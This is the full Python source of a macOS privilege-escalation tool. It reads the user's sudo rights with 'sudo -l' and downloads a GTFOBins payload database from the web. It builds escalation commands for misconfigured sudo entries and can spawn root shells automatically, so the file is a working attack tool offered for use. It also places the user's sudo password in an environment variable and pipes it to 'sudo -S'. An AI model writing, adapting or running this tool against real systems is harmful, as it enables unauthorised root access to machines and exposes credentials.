#!/usr/bin/env python3
"""
sudown_macos.py: A sudo misconfiguration exploiter for macOS with dynamic GTFOBins integration.
"""
import os
import sys
import re
import json
import argparse
import platform
import getpass
import logging
import pty
import shutil
import time
from pathlib import Path

import requests

# Configuration for macOS
CACHE_DIR = Path.home() / 'Library' / 'Caches' / 'sudown'
GTFOBINS_URL = 'https://gtfobins.github.io/gtfobins.json'
GTFOBINS_CACHE = CACHE_DIR / 'sudown_gtfobins.json'
CACHE_TTL = 7 * 24 * 3600  # 7 days
DEFAULT_SHELL = os.getenv('SHELL', '/bin/zsh')

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

class SudoEntry:
    def __init__(self, binary, args, run_as, nopasswd):
        self.binary = binary
        self.args = args
        self.run_as = run_as
        self.nopasswd = nopasswd

    def to_dict(self):
        return {
            'binary': self.binary,
            'args': self.args,
            'run_as': self.run_as,
            'nopasswd': self.nopasswd
        }


def gather_system_info():
    info = {
        'host': platform.node(),
        'os': f"{platform.system()} {platform.mac_ver()[0]}",
        'arch': platform.machine(),
        'user': os.getenv('USER', 'unknown')
    }
    for k, v in info.items():
        logging.info(f"{k.capitalize()}: {v}")
    return info


def check_requirements():
    if not shutil.which('sudo'):
        logging.error("sudo not found in PATH")
        sys.exit(1)
    if not shutil.which(DEFAULT_SHELL):
        logging.error(f"Shell '{DEFAULT_SHELL}' not found in PATH")
        sys.exit(1)
    if not sys.stdin.isatty():
        logging.error("This script requires an interactive TTY")
        sys.exit(1)


def get_sudo_list():
    try:
        return os.popen('sudo -l 2>&1').read()
    except Exception as e:
        logging.error(f"Failed to run 'sudo -l': {e}")
        sys.exit(1)


def parse_sudo_list(output):
    entries = []
    pattern = re.compile(r'\((?P<run_as>[^)]+)\) (?P<type>NOPASSWD:|PASSWD:) (?P<cmd>.*)')
    for line in output.splitlines():
        match = pattern.search(line)
        if match:
            run_as = match.group('run_as')
            nopasswd = (match.group('type') == 'NOPASSWD:')
            cmd = match.group('cmd')
            parts = cmd.split()
            binary = parts[0]
            args = ' '.join(parts[1:]) if len(parts) > 1 else ''
            entries.append(SudoEntry(binary, args, run_as, nopasswd))
    return entries


def fetch_gtfobins(update=False):
    CACHE_DIR.mkdir(parents=True, exist_ok=True)
    if not update and GTFOBINS_CACHE.exists():
        mtime = GTFOBINS_CACHE.stat().st_mtime
        if (time.time() - mtime) < CACHE_TTL:
            with open(GTFOBINS_CACHE, 'r') as f:
                return json.load(f)
    logging.info("Fetching GTFOBins database...")
    try:
        resp = requests.get(GTFOBINS_URL, timeout=10)
        resp.raise_for_status()
        data = resp.json()
        with open(GTFOBINS_CACHE, 'w') as f:
            json.dump(data, f)
        return data
    except Exception as e:
        logging.error(f"Failed to fetch GTFOBins: {e}")
        if GTFOBINS_CACHE.exists():
            logging.info("Falling back to cached database.")
            with open(GTFOBINS_CACHE, 'r') as f:
                return json.load(f)
        sys.exit(1)


def build_exploits(entries, gtfobins_db):
    results = []
    for entry in entries:
        name = os.path.basename(entry.binary)
        if name not in gtfobins_db:
            continue
        data = gtfobins_db[name]
        raw = data.get('exploits', {})
        for method, meta in raw.items():
            # support metadata format with os tag and payload
            if isinstance(meta, dict):
                os_list = meta.get('os', [])
                if 'darwin' not in os_list:
                    continue
                payload = meta.get('payload')
            else:
                payload = meta
            if not payload:
                continue
            full = payload.replace(name, entry.binary, 1) if payload.startswith(name) else f"{entry.binary} {payload}"
            if entry.nopasswd:
                cmd = f"sudo {full}"
            else:
                cmd = f"echo $PASSWORD | sudo -S {full}"
            results.append({
                'binary': entry.binary,
                'run_as': entry.run_as,
                'nopasswd': entry.nopasswd,
                'exploit': cmd
            })
    return results


def spawn_shell(command_str):
    logging.info(f"Spawning shell with: {command_str}")
    pty.spawn([DEFAULT_SHELL, '-c', command_str])


def main():
    parser = argparse.ArgumentParser(description="Sudo misconfiguration exploiter for macOS.")
    parser.add_argument('-a', '--auto', action='store_true', help='Automatically spawn shell for NOPASSWD exploits')
    parser.add_argument('-f', '--first', action='store_true', help='Stop after first exploit')
    parser.add_argument('-n', '--no-spawn', action='store_true', help='Do not spawn any shells')
    parser.add_argument('-u', '--update-db', action='store_true', help='Fetch latest GTFOBins database')
    parser.add_argument('-j', '--json', action='store_true', help='Output results as JSON')
    args = parser.parse_args()

    gather_system_info()
    check_requirements()
    entries = parse_sudo_list(get_sudo_list())
    if not entries:
        logging.warning("No sudo entries found.")
        return

    pwd = None
    if any(not e.nopasswd for e in entries):
        pwd = getpass.getpass('Sudo password (for PASSWD entries): ')
        os.environ['PASSWORD'] = pwd

    gtfobins_db = fetch_gtfobins(update=args.update_db)
    exploits = build_exploits(entries, gtfobins_db)

    if args.json:
        print(json.dumps(exploits, indent=2))
        return

    count = 0
    for exp in exploits:
        print(f"[*] {exp['exploit']}")
        count += 1
        if args.auto and exp['nopasswd'] and not args.no_spawn:
            spawn_shell(exp['exploit'])
        if args.first and count >= 1:
            break
    if count == 0:
        logging.info("No exploitable entries found in GTFOBins database.")

if __name__ == '__main__':
    main()
